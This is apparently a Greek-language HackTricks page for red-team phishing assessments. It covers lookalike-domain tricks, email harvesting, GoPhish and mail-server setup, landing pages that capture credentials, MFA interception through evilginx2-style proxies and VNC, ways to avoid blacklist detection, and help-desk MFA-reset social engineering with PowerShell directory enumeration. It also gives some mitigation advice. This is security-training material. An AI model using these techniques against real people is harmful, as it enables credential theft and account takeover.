# Μεθοδολογία Phishing

{{#include ../../banners/hacktricks-training.md}}

## Μεθοδολογία

1. Κάντε Recon του θύματος
   1. Επιλέξτε το **domain του θύματος**.
   2. Κάντε βασική απαρίθμηση στο web **αναζητώντας login portals** που χρησιμοποιεί το θύμα και **αποφασίστε** ποιο θα **παραστήσετε**.
   3. Χρησιμοποιήστε **OSINT** για να **βρείτε emails**.
2. Προετοιμάστε το περιβάλλον
   1. **Αγοράστε το domain** που θα χρησιμοποιήσετε για την αξιολόγηση phishing.
   2. **Διαμορφώστε τις σχετικές εγγραφές της υπηρεσίας email** (SPF, DMARC, DKIM, rDNS).
   3. Διαμορφώστε το VPS με **gophish**.
3. Προετοιμάστε την καμπάνια
   1. Ετοιμάστε το **πρότυπο email**.
   2. Ετοιμάστε τη **web σελίδα** για την υποκλοπή των διαπιστευτηρίων.
4. Ξεκινήστε την καμπάνια!

## Δημιουργία παρόμοιων domain names ή αγορά έμπιστου domain

### Τεχνικές παραλλαγής domain name

- **Λέξη-κλειδί**: Το domain name **περιέχει** μια σημαντική **λέξη-κλειδί** του αρχικού domain (π.χ., zelster.com-management.com).<sup>[[1]](#references)</sup>
- **Subdomain με παύλα**: Αντικαταστήστε την **τελεία με παύλα** σε ένα subdomain (π.χ., www-zelster.com).
- **Νέο TLD**: Ίδιο domain με **νέο TLD** (π.χ., zelster.org).
- **Homoglyph**: **Αντικαθιστά** ένα γράμμα στο domain name με **γράμματα που μοιάζουν** (π.χ., zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Μετάθεση:** **Αλλάζει τη θέση δύο γραμμάτων** μέσα στο domain name (π.χ., zelsetr.com).
- **Ενικός/πληθυντικός**: Προσθέτει ή αφαιρεί το “s” από το τέλος του domain name (π.χ., zeltsers.com).
- **Παράλειψη**: **Αφαιρεί ένα** από τα γράμματα του domain name (π.χ., zelser.com).
- **Επανάληψη:** **Επαναλαμβάνει ένα** από τα γράμματα του domain name (π.χ., zeltsser.com).
- **Αντικατάσταση**: Όπως το homoglyph, αλλά λιγότερο δυσδιάκριτη. Αντικαθιστά ένα από τα γράμματα του domain name, ενδεχομένως με ένα γράμμα που βρίσκεται κοντά στο αρχικό γράμμα στο πληκτρολόγιο (π.χ., zektser.com).
- **Προσθήκη subdomain**: Εισάγει μια **τελεία** μέσα στο domain name (π.χ., ze.lster.com).
- **Εισαγωγή**: **Εισάγει ένα γράμμα** στο domain name (π.χ., zerltser.com).
- **Παράλειψη τελείας**: Προσθέτει το TLD στο domain name (π.χ., zelstercom.com).

**Αυτόματα εργαλεία**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Ιστότοποι**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

Υπάρχει **πιθανότητα κάποια από τα αποθηκευμένα bit ή τα bit που μεταδίδονται να αντιστραφούν αυτόματα** λόγω διαφόρων παραγόντων, όπως ηλιακές εκλάμψεις, κοσμικές ακτίνες ή σφάλματα υλικού.

Όταν αυτή η έννοια **εφαρμόζεται σε αιτήματα DNS**, είναι πιθανό το **domain που λαμβάνει ο DNS server** να μην είναι ίδιο με το domain που ζητήθηκε αρχικά.

Για παράδειγμα, μια αλλαγή ενός bit στο domain "windows.com" μπορεί να το μετατρέψει σε "windnws.com".

Οι επιτιθέμενοι μπορεί να **εκμεταλλευτούν αυτό το ενδεχόμενο καταχωρίζοντας πολλαπλά domains με bit-flipping** που μοιάζουν με το domain του θύματος. Σκοπός τους είναι να ανακατευθύνουν νόμιμους χρήστες στη δική τους υποδομή.

Για περισσότερες πληροφορίες, διαβάστε το [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/).<sup>[[10]](#references)[[11]](#references)</sup>

### Αγορά έμπιστου domain

Μπορείτε να αναζητήσετε στο [https://www.expireddomains.net/](https://www.expireddomains.net) ένα ληγμένο domain που θα μπορούσατε να χρησιμοποιήσετε.\
Για να βεβαιωθείτε ότι το ληγμένο domain που σκοπεύετε να αγοράσετε **έχει ήδη καλό SEO**, μπορείτε να αναζητήσετε σε ποια κατηγορία έχει ταξινομηθεί στους εξής ιστότοπους:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Εντοπισμός emails

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% δωρεάν)
- [https://phonebook.cz/](https://phonebook.cz) (100% δωρεάν)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

Για να **εντοπίσετε περισσότερες** έγκυρες διευθύνσεις email ή να **επαληθεύσετε όσες** έχετε ήδη εντοπίσει, μπορείτε να ελέγξετε αν μπορείτε να κάνετε brute-force στους SMTP servers του θύματος. [Μάθετε εδώ πώς να επαληθεύετε/εντοπίζετε διευθύνσεις email](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Επιπλέον, μην ξεχνάτε ότι αν οι χρήστες χρησιμοποιούν **κάποιο web portal για πρόσβαση στα email τους**, μπορείτε να ελέγξετε αν είναι ευάλωτο σε **brute force ονομάτων χρήστη** και, αν είναι δυνατό, να εκμεταλλευτείτε την ευπάθεια.

## Διαμόρφωση του GoPhish

### Εγκατάσταση

Μπορείτε να το κατεβάσετε από το [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

Κατεβάστε το και αποσυμπιέστε το μέσα στο `/opt/gophish` και εκτελέστε το `/opt/gophish/gophish`\
Στην έξοδο θα εμφανιστεί ένας κωδικός πρόσβασης για τον admin χρήστη στη θύρα 3333. Επομένως, αποκτήστε πρόσβαση σε αυτή τη θύρα και χρησιμοποιήστε αυτά τα διαπιστευτήρια για να αλλάξετε τον κωδικό πρόσβασης του admin. Ίσως χρειαστεί να κάνετε tunnel τη θύρα προς το local:

```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```

### Διαμόρφωση

**Διαμόρφωση πιστοποιητικού TLS**

Πριν από αυτό το βήμα, θα πρέπει να έχετε **ήδη αγοράσει το domain** που πρόκειται να χρησιμοποιήσετε και αυτό πρέπει να **δείχνει** στη **διεύθυνση IP του VPS** όπου διαμορφώνετε το **gophish**.

```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```

**Ρύθμιση mail**

Ξεκινήστε την εγκατάσταση: `apt-get install postfix`

Στη συνέχεια, προσθέστε το domain στα ακόλουθα αρχεία:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Αλλάξτε επίσης τις τιμές των ακόλουθων μεταβλητών μέσα στο /etc/postfix/main.cf**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Τέλος, τροποποιήστε τα αρχεία **`/etc/hostname`** και **`/etc/mailname`** ώστε να περιέχουν το όνομα του domain σας και **επανεκκινήστε το VPS.**

Τώρα, δημιουργήστε μια **DNS A record** για το `mail.<domain>` που να δείχνει στη **διεύθυνση IP** του VPS και μια **DNS MX** record που να δείχνει στο `mail.<domain>`

Τώρα, ας δοκιμάσουμε να στείλουμε ένα email:

```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```

**Ρύθμιση του Gophish**

Σταματήστε την εκτέλεση του gophish και ας το ρυθμίσουμε.\
Τροποποιήστε το `/opt/gophish/config.json` ως εξής (προσέξτε τη χρήση του https):

```bash
{
        "admin_server": {
                "listen_url": "127.0.0.1:3333",
                "use_tls": true,
                "cert_path": "gophish_admin.crt",
                "key_path": "gophish_admin.key"
        },
        "phish_server": {
                "listen_url": "0.0.0.0:443",
                "use_tls": true,
                "cert_path": "/opt/gophish/ssl_keys/key.crt",
                "key_path": "/opt/gophish/ssl_keys/key.pem"
        },
        "db_name": "sqlite3",
        "db_path": "gophish.db",
        "migrations_prefix": "db/db_",
        "contact_address": "",
        "logging": {
                "filename": "",
                "level": ""
        }
}
```

**Διαμόρφωση της υπηρεσίας gophish**

Για να δημιουργήσετε την υπηρεσία gophish, ώστε να εκκινείται αυτόματα και να μπορείτε να τη διαχειρίζεστε ως υπηρεσία, δημιουργήστε το αρχείο `/etc/init.d/gophish` με το ακόλουθο περιεχόμενο:

```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
    echo 'Starting '${processName}'...'
    cd ${appDirectory}
    nohup ./$process >>$logfile 2>>$errfile &
    sleep 1
}

stop() {
    echo 'Stopping '${processName}'...'
    pid=$(/bin/pidof ${process})
    kill ${pid}
    sleep 1
}

status() {
    pid=$(/bin/pidof ${process})
    if [["$pid" != ""| "$pid" != "" ]]; then
        echo ${processName}' is running...'
    else
        echo ${processName}' is not running...'
    fi
}

case $1 in
    start|stop|status) "$1" ;;
esac
```

Ολοκληρώστε τη διαμόρφωση της υπηρεσίας και ελέγξτε τη ως εξής:

```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```

## Διαμόρφωση mail server και domain

### Περιμένετε & δείξτε νομιμότητα

Όσο παλαιότερο είναι ένα domain, τόσο λιγότερο πιθανό είναι να χαρακτηριστεί ως spam. Επομένως, θα πρέπει να περιμένετε όσο το δυνατόν περισσότερο (τουλάχιστον 1 εβδομάδα) πριν από το phishing assessment. Επιπλέον, αν προσθέσετε μια σελίδα για έναν τομέα με καλή φήμη, η φήμη που θα αποκτήσετε θα είναι καλύτερη.

Σημειώστε ότι, ακόμη κι αν πρέπει να περιμένετε μία εβδομάδα, μπορείτε να ολοκληρώσετε τη διαμόρφωση όλων τώρα.

### Διαμόρφωση εγγραφής Reverse DNS (rDNS)

Ορίστε μια εγγραφή rDNS (PTR) που αντιστοιχίζει τη διεύθυνση IP του VPS στο όνομα domain.

### Εγγραφή Sender Policy Framework (SPF)

Πρέπει να **διαμορφώσετε μια εγγραφή SPF για το νέο domain**. Αν δεν γνωρίζετε τι είναι μια εγγραφή SPF, [**διαβάστε αυτή τη σελίδα**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

Μπορείτε να χρησιμοποιήσετε το [https://www.spfwizard.net/](https://www.spfwizard.net) για να δημιουργήσετε την πολιτική SPF (χρησιμοποιήστε την IP του VPS).

![Φόρμα του SPF Wizard για τη δημιουργία εγγραφής SPF για ένα domain phishing](<../../images/image (1037).png>)

Αυτό είναι το περιεχόμενο που πρέπει να οριστεί μέσα σε μια εγγραφή TXT στο domain:

```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```

### Εγγραφή Domain-based Message Authentication, Reporting & Conformance (DMARC)

Πρέπει να **ρυθμίσετε μια εγγραφή DMARC για το νέο domain**. Αν δεν γνωρίζετε τι είναι μια εγγραφή DMARC, [**διαβάστε αυτή τη σελίδα**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Πρέπει να δημιουργήσετε μια νέα εγγραφή DNS TXT για το hostname `_dmarc.<domain>` με το ακόλουθο περιεχόμενο:

```bash
v=DMARC1; p=none
```

### DomainKeys Identified Mail (DKIM)

Πρέπει να **ρυθμίσετε ένα DKIM για το νέο domain**. Αν δεν γνωρίζετε τι είναι μια εγγραφή DKIM, [**διαβάστε αυτήν τη σελίδα**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

Αυτό το tutorial βασίζεται στο: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy).<sup>[[5]](#references)</sup>

> [!TIP]
> Πρέπει να συνενώσετε και τις δύο τιμές B64 που δημιουργεί το κλειδί DKIM:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Ελέγξτε τη βαθμολογία της διαμόρφωσης email σας

Μπορείτε να το κάνετε χρησιμοποιώντας το [https://www.mail-tester.com/](https://www.mail-tester.com)\
Απλώς επισκεφτείτε τη σελίδα και στείλτε ένα email στη διεύθυνση που σας δίνουν:

```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```

Μπορείτε επίσης να **ελέγξετε τη διαμόρφωση του email σας**, στέλνοντας ένα email στη διεύθυνση `check-auth@verifier.port25.com` και **διαβάζοντας την απάντηση** (γι’ αυτό θα χρειαστεί να **ανοίξετε** τη θύρα **25** και να δείτε την απάντηση στο αρχείο _/var/mail/root_, αν στείλετε το email ως root).\
Βεβαιωθείτε ότι περνάτε όλες τις δοκιμές:

```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```

Μπορείτε επίσης να στείλετε **μήνυμα σε έναν λογαριασμό Gmail που ελέγχετε** και να ελέγξετε τις **κεφαλίδες του email** στα εισερχόμενα του Gmail σας. Το `dkim=pass` θα πρέπει να εμφανίζεται στο πεδίο κεφαλίδας `Authentication-Results`.

```
Authentication-Results: mx.google.com;
       spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
       dkim=pass header.i=@example.com;
```

### ​Αφαίρεση από τη μαύρη λίστα του Spamhaus

Η σελίδα [www.mail-tester.com](https://www.mail-tester.com) μπορεί να σας ενημερώσει αν το domain σας αποκλείεται από το Spamhaus. Μπορείτε να ζητήσετε την αφαίρεση του domain/IP σας στη διεύθυνση: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Αφαίρεση από τη μαύρη λίστα της Microsoft

​​Μπορείτε να ζητήσετε την αφαίρεση του domain/IP σας στη διεύθυνση [https://sender.office.com/](https://sender.office.com).

## Δημιουργία και εκκίνηση καμπάνιας GoPhish

### Προφίλ αποστολής

- Ορίστε ένα **όνομα αναγνώρισης** για το προφίλ αποστολέα
- Αποφασίστε από ποιον λογαριασμό θα στείλετε τα email phishing. Προτάσεις: _noreply, support, servicedesk, salesforce..._
- Μπορείτε να αφήσετε κενά το όνομα χρήστη και τον κωδικό πρόσβασης, αλλά βεβαιωθείτε ότι έχετε επιλέξει το Ignore Certificate Errors

![Δημιουργία και εκκίνηση καμπάνιας GoPhish - Προφίλ αποστολής: Μπορείτε να αφήσετε κενά το όνομα χρήστη και τον κωδικό πρόσβασης, αλλά βεβαιωθείτε ότι έχετε επιλέξει το Ignore Certificate Errors](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> Συνιστάται να χρησιμοποιήσετε τη λειτουργία "**Αποστολή δοκιμαστικού email**" για να ελέγξετε ότι όλα λειτουργούν.\
> Θα συνιστούσα να **στείλετε τα δοκιμαστικά email σε διευθύνσεις email 10min** ώστε να αποφύγετε τον αποκλεισμό σας κατά τις δοκιμές.

### Πρότυπο email

- Ορίστε ένα **όνομα αναγνώρισης** για το πρότυπο
- Στη συνέχεια, γράψτε ένα **θέμα** (τίποτα ασυνήθιστο, απλώς κάτι που θα περιμένατε να διαβάσετε σε ένα κανονικό email)
- Βεβαιωθείτε ότι έχετε επιλέξει το "**Προσθήκη εικόνας παρακολούθησης**"
- Γράψτε το **πρότυπο email** (μπορείτε να χρησιμοποιήσετε μεταβλητές, όπως στο ακόλουθο παράδειγμα):

```html
<html>
<head>
    <title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```

Σημειώστε ότι **για να αυξηθεί η αξιοπιστία του email**, συνιστάται να χρησιμοποιήσετε κάποια υπογραφή από email του πελάτη. Προτάσεις:

- Στείλτε email σε μια **ανύπαρκτη διεύθυνση** και ελέγξτε αν η απάντηση περιλαμβάνει υπογραφή.
- Αναζητήστε **δημόσια email**, όπως info@ex.com ή press@ex.com ή public@ex.com, στείλτε τους email και περιμένετε την απάντηση.
- Προσπαθήστε να επικοινωνήσετε με κάποιο **έγκυρο email που εντοπίσατε** και περιμένετε την απάντηση.

![Sending Profile - Email Template: Δοκιμάστε να επικοινωνήσετε με κάποιο έγκυρο email που εντοπίσατε και περιμένετε την απάντηση](<../../images/image (80).png>)

> [!TIP]
> Το Email Template επιτρέπει επίσης την **επισύναψη αρχείων προς αποστολή**. Αν θέλετε να υποκλέψετε και NTLM challenges χρησιμοποιώντας ειδικά διαμορφωμένα αρχεία/έγγραφα, [διαβάστε αυτή τη σελίδα](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Σελίδα προορισμού

- Γράψτε ένα **όνομα**
- **Γράψτε τον κώδικα HTML** της ιστοσελίδας. Σημειώστε ότι μπορείτε να **εισαγάγετε** ιστοσελίδες.
- Επιλέξτε **Capture Submitted Data** και **Capture Passwords**
- Ορίστε μια **ανακατεύθυνση**

![Email Template - Σελίδα προορισμού: Επιλέξτε Capture Submitted Data και Capture Passwords](<../../images/image (826).png>)

> [!TIP]
> Συνήθως θα χρειαστεί να τροποποιήσετε τον κώδικα HTML της σελίδας και να κάνετε κάποιες δοκιμές τοπικά (ίσως χρησιμοποιώντας κάποιον Apache server) **μέχρι να σας ικανοποιεί το αποτέλεσμα.** Έπειτα, γράψτε αυτόν τον κώδικα HTML στο πεδίο.\
> Σημειώστε ότι αν χρειάζεται να **χρησιμοποιήσετε στατικούς πόρους** για το HTML (ίσως κάποιες σελίδες CSS και JS), μπορείτε να τους αποθηκεύσετε στο _**/opt/gophish/static/endpoint**_ και έπειτα να αποκτήσετε πρόσβαση σε αυτούς από το _**/static/\<filename>**_

> [!TIP]
> Για την ανακατεύθυνση, μπορείτε να **ανακατευθύνετε τους χρήστες στην επίσημη κύρια ιστοσελίδα** του θύματος ή, για παράδειγμα, να τους ανακατευθύνετε στο _/static/migration.html_, να εμφανίσετε έναν **περιστρεφόμενο τροχό (**[**https://loading.io/**](https://loading.io)**) για 5 δευτερόλεπτα και έπειτα να αναφέρετε ότι η διαδικασία ολοκληρώθηκε με επιτυχία**.

### Χρήστες και ομάδες

- Ορίστε ένα όνομα
- **Εισαγάγετε τα δεδομένα** (σημειώστε ότι για να χρησιμοποιήσετε το template του παραδείγματος, χρειάζεστε το όνομα, το επώνυμο και τη διεύθυνση email κάθε χρήστη)

![Landing Page - Χρήστες και ομάδες: Εισαγάγετε τα δεδομένα (σημειώστε ότι για να χρησιμοποιήσετε το template του παραδείγματος, χρειάζεστε το όνομα, το επώνυμο και τη διεύθυνση email κάθε χρήστη)](<../../images/image (163).png>)

### Καμπάνια

Τέλος, δημιουργήστε μια καμπάνια επιλέγοντας όνομα, το email template, τη σελίδα προορισμού, το URL, το sending profile και την ομάδα. Σημειώστε ότι το URL θα είναι ο σύνδεσμος που θα σταλεί στα θύματα.

Σημειώστε ότι το **Sending Profile επιτρέπει την αποστολή δοκιμαστικού email, ώστε να δείτε πώς θα είναι το τελικό phishing email**:

![Users & Groups - Campaign: Σημειώστε ότι το Sending Profile επιτρέπει την αποστολή δοκιμαστικού email, ώστε να δείτε πώς θα είναι το τελικό phishing email](<../../images/image (192).png>)

Μόλις είναι όλα έτοιμα, ξεκινήστε την καμπάνια!

## Κλωνοποίηση ιστοτόπου

Αν για οποιονδήποτε λόγο θέλετε να κλωνοποιήσετε τον ιστότοπο, δείτε την ακόλουθη σελίδα:


{{#ref}}
clone-a-website.md
{{#endref}}

## Έγγραφα και αρχεία με backdoor

Σε ορισμένες αξιολογήσεις phishing (κυρίως για Red Teams), θα θέλετε επίσης να **στείλετε αρχεία που περιέχουν κάποιο είδος backdoor** (ίσως ένα C2 ή απλώς κάτι που θα ενεργοποιήσει μια διαδικασία authentication).\
Δείτε την ακόλουθη σελίδα για παραδείγματα:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Μέσω Proxy MitM

Η προηγούμενη επίθεση είναι αρκετά έξυπνη, καθώς προσποιείστε ότι είστε ένας πραγματικός ιστότοπος και συλλέγετε τις πληροφορίες που καταχωρίζει ο χρήστης. Δυστυχώς, αν ο χρήστης δεν εισαγάγει τον σωστό κωδικό πρόσβασης ή αν η εφαρμογή που πλαστογραφήσατε έχει ρυθμιστεί με 2FA, **αυτές οι πληροφορίες δεν θα σας επιτρέψουν να προσποιηθείτε ότι είστε ο χρήστης που εξαπατήθηκε**.

Εδώ είναι χρήσιμα εργαλεία όπως τα [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) και [**muraena**](https://github.com/muraenateam/muraena). Αυτό το εργαλείο επιτρέπει τη δημιουργία μιας επίθεσης τύπου MitM. Βασικά, οι επιθέσεις λειτουργούν ως εξής:

1. **Προσποιείστε τη φόρμα σύνδεσης** της πραγματικής ιστοσελίδας.
2. Ο χρήστης **στέλνει** τα **διαπιστευτήριά** του στην ψεύτικη σελίδα σας και το εργαλείο τα στέλνει στην πραγματική ιστοσελίδα, **ελέγχοντας αν τα διαπιστευτήρια είναι έγκυρα**.
3. Αν ο λογαριασμός έχει ρυθμιστεί με **2FA**, η σελίδα MitM θα ζητήσει τον κωδικό και, μόλις **τον εισαγάγει ο χρήστης**, το εργαλείο θα τον στείλει στην πραγματική ιστοσελίδα.
4. Μόλις γίνει authentication του χρήστη, εσείς (ως attacker) θα έχετε **υποκλέψει τα διαπιστευτήρια, το 2FA, το cookie και οποιαδήποτε πληροφορία από κάθε αλληλεπίδραση κατά τη διάρκεια της επίθεσης MitM**.

### Μέσω VNC

Τι θα γινόταν αν αντί να **στείλετε το θύμα σε μια κακόβουλη σελίδα** που μοιάζει με την αρχική, το στέλνατε σε μια **συνεδρία VNC με browser συνδεδεμένο στην πραγματική ιστοσελίδα**; Θα μπορούσατε να δείτε τι κάνει, να υποκλέψετε τον κωδικό πρόσβασης, το MFA που χρησιμοποιείται, τα cookies...\
Μπορείτε να το κάνετε αυτό με το [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC).<sup>[[3]](#references)[[4]](#references)</sup>

## Ανίχνευση της ανίχνευσης

Προφανώς, ένας από τους καλύτερους τρόπους για να μάθετε αν σας έχουν εντοπίσει είναι να **αναζητήσετε το domain σας σε blacklists**. Αν εμφανίζεται σε κάποια λίστα, τότε το domain σας έχει κατά κάποιον τρόπο επισημανθεί ως ύποπτο.\
Ένας εύκολος τρόπος για να ελέγξετε αν το domain σας εμφανίζεται σε κάποια blacklist είναι να χρησιμοποιήσετε το [https://malwareworld.com/](https://malwareworld.com)

Ωστόσο, υπάρχουν και άλλοι τρόποι για να μάθετε αν το θύμα **αναζητά ενεργά ύποπτη δραστηριότητα phishing στο διαδίκτυο**, όπως εξηγείται στη:


{{#ref}}
detecting-phising.md
{{#endref}}

Μπορείτε να **αγοράσετε ένα domain με όνομα πολύ παρόμοιο** με το domain του θύματος **και/ή να δημιουργήσετε ένα certificate** για ένα **subdomain** domain που ελέγχετε, **το οποίο να περιέχει** τη **λέξη-κλειδί** του domain του θύματος. Αν το **θύμα** πραγματοποιήσει οποιουδήποτε είδους **αλληλεπίδραση DNS ή HTTP** με αυτά, θα γνωρίζετε ότι **αναζητά ενεργά** ύποπτα domains και θα χρειαστεί να είστε πολύ διακριτικοί.<sup>[[2]](#references)</sup>

### Αξιολόγηση του phishing

Χρησιμοποιήστε το [**Phishious** ](https://github.com/Rices/Phishious)για να αξιολογήσετε αν το email σας θα καταλήξει στον φάκελο spam ή αν θα αποκλειστεί ή θα παραδοθεί επιτυχώς.

## Παραβίαση ταυτότητας με άμεση προσέγγιση (Επαναφορά MFA από το Help Desk)

Οι σύγχρονες ομάδες εισβολής παρακάμπτουν όλο και συχνότερα τα email lures και **στοχεύουν απευθείας τη ροή εργασιών του service desk / ανάκτησης ταυτότητας**, ώστε να παρακάμψουν το MFA. Η επίθεση βασίζεται εξ ολοκλήρου στην τακτική "living-off-the-land": μόλις ο operator αποκτήσει έγκυρα διαπιστευτήρια, κινείται πλευρικά με ενσωματωμένα εργαλεία διαχείρισης – δεν απαιτείται malware.<sup>[[6]](#references)</sup>

### Ροή επίθεσης
1. Αναγνώριση του θύματος 
   * Συλλογή προσωπικών και εταιρικών στοιχείων από το LinkedIn, διαρροές δεδομένων, δημόσια repositories στο GitHub κ.λπ.  
   * Εντοπισμός ταυτοτήτων υψηλής αξίας (στελέχη, IT, οικονομικό τμήμα) και καταγραφή της **ακριβούς διαδικασίας του help desk** για επαναφορά κωδικού πρόσβασης / MFA.
2. Κοινωνική μηχανική σε πραγματικό χρόνο  
   * Τηλεφωνήστε, επικοινωνήστε μέσω Teams ή στείλτε μήνυμα στο help desk, προσποιούμενοι τον στόχο (συχνά με **παραποιημένο caller-ID** ή **κλωνοποιημένη φωνή**).  
   * Δώστε τα PII που συλλέξατε προηγουμένως, ώστε να περάσετε την επαλήθευση βάσει γνώσεων.  
   * Πείστε τον agent να **επαναφέρει το μυστικό MFA** ή να πραγματοποιήσει **SIM-swap** σε καταχωρισμένο αριθμό κινητού.
3. Άμεσες ενέργειες μετά την απόκτηση πρόσβασης (≤60 λεπτά σε πραγματικές περιπτώσεις)  
   * Δημιουργήστε ένα αρχικό σημείο πρόσβασης μέσω οποιασδήποτε πύλης web SSO.  
   * Καταγράψτε στοιχεία από AD / AzureAD χρησιμοποιώντας ενσωματωμένα εργαλεία (χωρίς να αποθέσετε binaries):
     ```powershell
     # list directory groups & privileged roles
     Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

     # AzureAD / Graph – list directory roles
     Get-MgDirectoryRole | ft DisplayName,Id

     # Enumerate devices the account can login to
     Get-MgUserRegisteredDevice -UserId <user@corp.local>
     ```
   * Lateral movement με **WMI**, **PsExec** ή νόμιμους agents **RMM** που είναι ήδη στη λίστα επιτρεπόμενων στο περιβάλλον.

### Ανίχνευση & Μετριασμός
* Αντιμετωπίζετε την ανάκτηση ταυτότητας από το help desk ως **προνομιακή ενέργεια** – απαιτήστε step-up auth και έγκριση από manager.
* Εφαρμόστε κανόνες **Identity Threat Detection & Response (ITDR)** / **UEBA** που ειδοποιούν για:  
  * Αλλαγή μεθόδου MFA + authentication από νέα συσκευή / γεωγραφική τοποθεσία.
  * Άμεση αναβάθμιση δικαιωμάτων του ίδιου principal (user-→-admin).
* Καταγράφετε τις κλήσεις στο help desk και απαιτείτε **επιστροφή κλήσης σε ήδη καταχωρισμένο αριθμό** πριν από οποιοδήποτε reset.
* Εφαρμόστε **Just-In-Time (JIT) / Privileged Access**, ώστε οι λογαριασμοί που μόλις υπέστησαν reset να **μην** κληρονομούν αυτόματα tokens υψηλών προνομίων.

---

## Παραπλάνηση μεγάλης κλίμακας – Καμπάνιες SEO Poisoning & “ClickFix”
Οι συνηθισμένες ομάδες αντισταθμίζουν το κόστος των επιχειρήσεων υψηλής έντασης με μαζικές επιθέσεις που μετατρέπουν τις **μηχανές αναζήτησης και τα διαφημιστικά δίκτυα σε κανάλι παράδοσης**.<sup>[[6]](#references)</sup>

1. Το **SEO poisoning / malvertising** προωθεί ένα ψεύτικο αποτέλεσμα, όπως το `chromium-update[.]site`, στην κορυφή των διαφημίσεων αναζήτησης.
2. Το θύμα κατεβάζει ένα μικρό **loader πρώτου σταδίου** (συχνά JS/HTA/ISO). Παραδείγματα που εντόπισε η Unit 42:
   * `RedLine stealer`
   * `Lumma stealer`
   * `Lampion Trojan`
